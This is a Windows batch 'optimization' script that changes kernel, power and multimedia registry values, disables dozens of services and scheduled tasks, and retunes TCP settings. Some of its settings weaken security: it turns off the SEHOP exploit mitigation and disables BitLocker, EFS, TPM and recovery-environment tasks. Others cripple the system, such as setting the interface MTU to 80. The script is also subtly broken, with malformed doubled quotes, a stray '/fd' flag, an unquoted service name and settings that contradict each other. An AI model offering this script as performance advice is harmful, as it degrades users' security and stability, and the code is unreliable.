Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""DisableDynamicTick"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""DynamicTick"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""EnergyDriverPolicy"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""EnergyDriverPolicyVideo"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""TimerBResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""TimerReliability"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""KernelIoPriority"" /t REG_DWORD /d ""3"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""DisableLowQosTimerResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""TimerCheckFlags"" /t REG_DWORD /d ""8"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""SplitLargeCaches"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""GlobalTimerResolutionRequests"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""EnablePerCpuClockTickScheduling"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""CacheErrataOverride"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""CacheAwareScheduling"" /t REG_DWORD /d ""5"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""ForceApicPhysicalDestinationMode"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""TscInvariant"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""ForceClockSync"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""TscSyncPolicy"" /t REG_DWORD /d ""2"" /f
reg add "HKLM\System\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WinHttpAutoProxySvc" /v "Start" /t REG_DWORD /d "4" /fd
reg add "HKLM\System\CurrentControlSet\Services\BcastDVRUserService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\xbgm" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "AudioCaptureEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "CursorCaptureEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "MicrophoneCaptureEnabled" /t REG_DWORD /d "0" /f
reg add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
reg add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "2" /f
reg add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows\GameDVR" /v "AllowgameDVR" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "0" /f
sc config wlidsvc start= disabled
sc config DisplayEnhancementService start= disabled
sc config DiagTrack start= disabled
sc config DusmSvc start= disabled
sc config TabletInputService start= disabled
sc config RetailDemo start= disabled
sc config Fax start= disabled
sc config SharedAccess start= disabled
sc config lfsvc start= disabled
sc config WpcMonSvc start= disabled
sc config SessionEnv start= disabled
sc config MicrosoftEdgeElevationService start= disabled
sc config edgeupdate start= disabled
sc config edgeupdatem start= disabled
sc config autotimesvc start= disabled
sc config CscService start= disabled
sc config TermService start= disabled
sc config SensorDataService start= disabled
sc config SensorService start= disabled
sc config SensrSvc start= disabled
sc config shpamsvc start= disabled
sc config diagnosticshub.standardcollector.service start= disabled
sc config PhoneSvc start= disabled
sc config TapiSrv start= disabled
sc config UevAgentService start= disabled
sc config WalletService start= disabled
sc config TokenBroker start= disabled
sc config WebClient start= disabled
sc config MixedRealityOpenXRSvc start= disabled
sc config stisvc start= disabled
sc config WbioSrvc start= disabled
sc config icssvc start= disabled
sc config Wecsvc start= disabled
sc config XboxGipSvc start= disabled
sc config XblAuthManager start= disabled
sc config XboxNetApiSvc start= disabled
sc config XblGameSave start= disabled
sc config SEMgrSvc start= disabled
sc config iphlpsvc start= disabled
sc config Backupper Service start= disabled
sc config BthAvctpSvc start= disabled
sc config BDESVC start= disabled
sc config cbdhsvc start= disabled
sc config CDPSvc start= disabled
sc config CDPUserSvc start= disabled
sc config DevQueryBroker start= disabled
sc config DevicesFlowUserSvc start= disabled
sc config dmwappushservice start= disabled
sc config DispBrokerDesktopSvc start= disabled
sc config TrkWks start= disabled
sc config dLauncherLoopback start= disabled
sc config EFS start= disabled
sc config fdPHost start= disabled
sc config FDResPub start= disabled
sc config IKEEXT start= disabled
sc config NPSMSvc start= disabled
sc config WPDBusEnum start= disabled
sc config PcaSvc start= disabled
sc config RasMan start= disabled
sc config RetailDemo start=disabled
sc config SstpSvc start=disabled
sc config ShellHWDetection start= disabled
sc config SSDPSRV start= disabled
sc config SysMain start= disabled
sc config OneSyncSvc start= disabled
sc config lmhosts start= disabled
sc config UserDataSvc start= disabled
sc config UnistoreSvc start= disabled
sc config Wcmsvc start= disabled
sc config FontCache start= disabled
sc config W32Time start= disabled
sc config tzautoupdate start= disabled
sc config DsSvc start= disabled
sc config DevicesFlowUserSvc_5f1ad start= disabled
sc config diagsvc start= disabled
sc config DialogBlockingService start= disabled
sc config PimIndexMaintenanceSvc_5f1ad start= disabled
sc config MessagingService_5f1ad start= disabled
sc config AppVClient start= disabled
sc config MsKeyboardFilter start= disabled
sc config NetTcpPortSharing start= disabled
sc config ssh-agent start= disabled
sc config SstpSvc start= disabled
sc config OneSyncSvc_5f1ad start= disabled
sc config wercplsupport start= disabled
sc config WMPNetworkSvc start= disabled
sc config WerSvc start= disabled
sc config WpnUserService_5f1ad start= disabled
sc config WinHttpAutoProxySvc start= disabled
sc config DsmSvc start= disabled
schtasks /DELETE /TN "AMDInstallLauncher" /f
schtasks /DELETE /TN "AMDLinkUpdate" /f
schtasks /DELETE /TN "AMDRyzenMasterSDKTask" /f
schtasks /DELETE /TN "Driver Easy Scheduled Scan" /f
schtasks /DELETE /TN "ModifyLinkUpdate" /f
schtasks /DELETE /TN "SoftMakerUpdater" /f
schtasks /DELETE /TN "StartCN" /f
schtasks /DELETE /TN "StartDVR" /f
schtasks /Change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\PcaPatchDbTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\StartupAppTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /Disable
schtasks /Change /TN "Microsoft\Windows\Defrag\ScheduledDefrag" /Disable
schtasks /Change /TN "Microsoft\Windows\Device Information\Device" /Disable
schtasks /Change /TN "Microsoft\Windows\Device Information\Device User" /Disable
schtasks /Change /TN "Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScanner" /Disable
schtasks /Change /TN "Microsoft\Windows\Diagnosis\Scheduled" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskCleanup\SilentCleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\Diagnostics" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\StorageSense" /Disable
schtasks /Change /TN "Microsoft\Windows\DUSM\dusmtask" /Disable
schtasks /Change /TN "Microsoft\Windows\EnterpriseMgmt\MDMMaintenenceTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Feedback\Siuf\DmClient" /Disable
schtasks /Change /TN "Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload" /Disable
schtasks /Change /TN "Microsoft\Windows\FileHistory\File History (maintenance mode)" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\ReconcileFeatures" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\UsageDataFlushing" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\UsageDataReporting" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\OneSettings\RefreshCache" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\LocalUserSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\MouseSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\PenSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\TouchpadSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\International\Synchronize Language Settings" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\Installation" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\ReconcileLanguageResources" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\Uninstallation" /Disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /Disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /Disable
schtasks /Change /TN "Microsoft\Windows\Management\Provisioning\Cellular" /Disable
schtasks /Change /TN "Microsoft\Windows\Management\Provisioning\Logon" /Disable
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable
schtasks /Change /TN "Microsoft\Windows\Maps\MapsToastTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Maps\MapsUpdateTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser" /Disable
schtasks /Change /TN "Microsoft\Windows\MUI\LPRemove" /Disable
schtasks /Change /TN "Microsoft\Windows\NetTrace\GatherNetworkInfo" /Disable
schtasks /Change /TN "Microsoft\Windows\PI\Sqm-Tasks" /Disable
schtasks /Change /TN "Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /Disable
schtasks /Change /TN "Microsoft\Windows\PushToInstall\Registration" /Disable
schtasks /Change /TN "Microsoft\Windows\Ras\MobilityManager" /Disable
schtasks /Change /TN "Microsoft\Windows\RecoveryEnvironment\VerifyWinRE" /Disable
schtasks /Change /TN "Microsoft\Windows\RemoteAssistance\RemoteAssistanceTask" /Disable
schtasks /Change /TN "Microsoft\Windows\RetailDemo\CleanupOfflineContent" /Disable
schtasks /Change /TN "Microsoft\Windows\Servicing\StartComponentCleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\SettingSync\NetworkStateChangeTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Setup\SetupCleanupTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Setup\SnapshotCleanupTask" /Disable
schtasks /Change /TN "Microsoft\Windows\SpacePort\SpaceAgentTask" /Disable
schtasks /Change /TN "Microsoft\Windows\SpacePort\SpaceManagerTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Speech\SpeechModelDownloadTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization" /Disable
schtasks /Change /TN "Microsoft\Windows\Sysmain\ResPriStaticDbSync" /Disable
schtasks /Change /TN "Microsoft\Windows\Sysmain\WsSwapAssessmentTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Task Manager\Interactive" /Disable
schtasks /Change /TN "Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" /Disable
schtasks /Change /TN "Microsoft\Windows\Time Synchronization\SynchronizeTime" /Disable
schtasks /Change /TN "Microsoft\Windows\Time Zone\SynchronizeTimeZone" /Disable
schtasks /Change /TN "Microsoft\Windows\TPM\Tpm-HASCertRetr" /Disable
schtasks /Change /TN "Microsoft\Windows\TPM\Tpm-Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\UPnP\UPnPHostConfig" /Disable
schtasks /Change /TN "Microsoft\Windows\User Profile Service\HiveUploadTask" /Disable
schtasks /Change /TN "Microsoft\Windows\WDI\ResolutionHost" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange" /Disable
schtasks /Change /TN "Microsoft\Windows\WOF\WIM-Hash-Management" /Disable
schtasks /Change /TN "Microsoft\Windows\WOF\WIM-Hash-Validation" /Disable
schtasks /Change /TN "Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /Disable
schtasks /Change /TN "Microsoft\Windows\Work Folders\Work Folders Maintenance Work" /Disable
schtasks /Change /TN "Microsoft\Windows\Workplace Join\Automatic-Device-Join" /Disable
schtasks /Change /TN "Microsoft\Windows\WwanSvc\NotificationTask" /Disable
schtasks /Change /TN "Microsoft\Windows\WwanSvc\OobeDiscovery" /Disable
schtasks /Change /TN "Microsoft\XblGameSave\XblGameSaveTask" /Disable
netsh interface tcp set global autotuning=normal
netsh int tcp set heuristics disabled
netsh int tcp set global rss=enabled
netsh int tcp set global chimney=enabled
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set global ecncapability=disabled
netsh int tcp set global timestamps=disabled
netsh int ipv4 set subinterface "Local Area Connection" mtu=80 store=persistent
netsh int tcp set global rsc=enabled
netsh int tcp set heuristics disabled
netsh int tcp set global dca=enabled
netsh int tcp set global netdma=enabled
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set supplemental template=custom icw=10
netsh int tcp set heuristics disabled
netsh interface ip delete arpcache
netsh winsock reset catalog
netsh winsock reset catalog
netsh interface ip delete arpcache
netsh winsock reset catalog
netsh winsock reset catalog
netsh interface ipv4 set subinterface "Local Area Connection" mtu=150 store=persistent
netsh interface ipv4 set subinterface "Internet" mtu=80 store=persistent
cls
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""TscAdjustDisable"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""ContextNoPatchMode"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""DisableTsx"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""DisableLowQosTimerResolution"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""KernelSEHOPEnabled"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""CoalescingTimerInterval"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""DebugPollInterval"" /t REG_DWORD /d ""1000"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""CoreParkingDisabled"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""PerfBoostAtGuaranteed"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""LowLatencyScalingPercentage"" /t REG_DWORD /d ""30"" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Priority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "BackgroundPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Priority" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_AutoGameModeDefaultProfile" /t REG_BINARY /d "01000100000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_GameModeRelatedProcesses" /t REG_BINARY /d "010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabledDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_DWORD /d "4096" /f
